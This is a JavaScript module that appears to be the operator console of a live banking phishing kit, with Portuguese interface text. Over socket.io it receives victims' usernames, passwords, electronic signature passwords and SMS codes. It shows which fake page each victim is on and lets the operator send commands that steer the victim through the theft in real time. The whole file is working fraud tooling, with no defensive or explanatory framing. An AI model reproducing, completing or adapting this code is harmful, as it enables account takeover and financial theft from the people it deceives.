const operators = (() => {
    //private var/functions
    const buttonsSendCommands = [...document.querySelectorAll('.btn-command')]

    //clientIdentify

    async function sendCommand() {
        if (buttonsSendCommands) {
            buttonsSendCommands.forEach((btn) => {
                btn.addEventListener('click', function (e) {
                    e.preventDefault()

                    const action = btn.dataset.action

                    if(action) {

                        if(document.querySelector('.statusOP'))
                            document.querySelector('.statusOP').innerHTML = action
                            
                        socket.emit(action, clientOperating)
                    }
                })
            })
        }
    }

    function countOnline(date) {
        let time = new Date() - new Date(date)

        time = new Date(time)

        let seconds = time.getSeconds()
        let minutes = time.getMinutes()

        time = time.getMinutes() + ':' + time.getSeconds()

        const roleTime = document.querySelector('.timeOperator')

        const containerRoleTime = roleTime.closest('.form-group')

        roleTime.remove()

        const newRoleTime = document.createElement('label')

        newRoleTime.classList.add('timeOperator')

        newRoleTime.innerHTML = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)

        containerRoleTime.append(newRoleTime)

        setInterval(() => {
            if (seconds == 59) {
                minutes = ('0' + (parseInt(minutes) + 1)).slice(-2)

                seconds = ('0' + 1).slice(-2)
            } else {
                seconds = ('0' + (parseInt(seconds) + 1)).slice(-2)
            }

            newRoleTime.innerHTML = minutes + ':' + seconds
        }, 1000)
    }

    function leaveClient() {
        const roleTime = document.querySelector('.timeOperator')

        const containerRoleTime = roleTime.closest('.form-group')

        roleTime.remove()

        const newRoleTime = document.createElement('label')

        newRoleTime.classList.add('timeOperator')

        newRoleTime.innerHTML = `SAIU`

        containerRoleTime.append(newRoleTime)
    }

    function receiver() {
        socket.on('sms', (client) => {
            document.querySelector('.opSms').value = client.sms

            document.querySelector('.statusOP').innerHTML = `Enviar SMS!`

            document.title = `Aguardando Comando`
        })
        socket.on('sendUser', client => {
            const { user, password, sms, eletronicPassword } = client
            const inputUser = document.querySelector('input.opUser');
            const inputPassword = document.querySelector('input.opPassword');
            const inputEletronic = document.querySelector('input.opAssign');
            const inputSMS = document.querySelector('input.opSms');

            if(inputUser) inputUser.value = user
            if(inputPassword) inputPassword.value = password
            if(inputEletronic) inputEletronic.value = eletronicPassword
            if(inputSMS) inputSMS.value = sms

            document.querySelector('.statusOP').innerHTML = `Usuário enviado`
        })

        socket.on('smsreceived', (client) => {
            document.querySelector('.opSms').value = client.sms
            document.querySelector('.statusOP').innerHTML = `SMS Enviado!`

            document.title = `Aguardando Comando`
        })

        socket.on('sendSignature', (client) => {
            document.querySelector('.opAssign').value = client.eletronicPassword

            document.querySelector('.statusOP').innerHTML = `Assinatura Enviada!`

            document.title = `Aguardando Comando`
        })

        socket.on('sendPassword', (client) => {
            document.querySelector('.opPassword').value = client.password

            document.querySelector('.statusOP').innerHTML = `Senha Enviada!`

            document.title = `Aguardando Comando`
        })

        socket.on('sendUser', (client) => {
            document.querySelector('.opUser').value = client.user

            document.querySelector('.statusOP').innerHTML = `Usuário Enviado!`

            document.title = `Aguardando Comando`
        })

        socket.on('finish', (client) => {
            if(client.id != clientOperating) return 

            document.querySelector('.statusOP').innerHTML = `Finalizado`

            document.title = `Finalizado`
        })

        socket.on('assignClient', (client) => {
            const { updatedAt } = client
            //relógio

            countOnline(updatedAt)
        })

        socket.on('reconnectClient', (client) => {
            if (client.id != clientOperating) return

            const { updatedAt } = client

            countOnline(updatedAt)
        })

        socket.on('await', (client) => {
            if (client.id != clientOperating) return
            document.title = `Aguardando Comando`
        })

        socket.on('inEletronic', (client) => {

            setTimeout(() => {
                document.title = `Online na assinatura`

                document.querySelector('.statusOP').innerHTML = `Online na assinatura`
            }, 500)
            
        })

        socket.on('inPassword', (client) => {
            document.title = `Online na Senha`

            document.querySelector('.statusOP').innerHTML = `Online na Senha`
        })

        socket.on('inSMS', (client) => {
            if (client.id != clientOperating) return

            setTimeout(() => {
                document.title = `Online no SMS`

                countOnline(client.updatedAt)

                document.querySelector('.statusOP').innerHTML = `Online no SMS`
            }, 500)
        })

        socket.on('clientDisconnect', (client) => {
            if (clientOperating == client.id) {
                document.querySelector('.statusOP').innerHTML = `SAIU`
                leaveClient()
            }
        })

        socket.on('inUser', client => {
            const { id, user, password, eletronicPassword, sms } = client

            if(clientOperating != id) return

            const inputUser = document.querySelector('input.opUser');
            const inputPassword = document.querySelector('input.opPassword');
            const inputEletronic = document.querySelector('input.opAssign');
            const inputSMS = document.querySelector('input.opSms');

            if(inputUser) inputUser.value = user
            if(inputPassword) inputPassword.value = password
            if(inputPassword) inputPassword.value = eletronicPassword
            if(inputPassword) inputPassword.value = sms

            if(document.querySelector('.statusOP')) document.querySelector('.statusOP').innerHTML = 'Na tela de usuário'
        })
    }

    function assignClient() {
        const token = document.body.dataset.token

        const data = {
            client: clientOperating,
            token: token,
        }

        socket.emit('assignClient', data)
    }

    return {
        //public var/functions
        sendCommand,
        receiver,
        assignClient,
    }
})()

operators.sendCommand()
operators.receiver()
operators.assignClient()
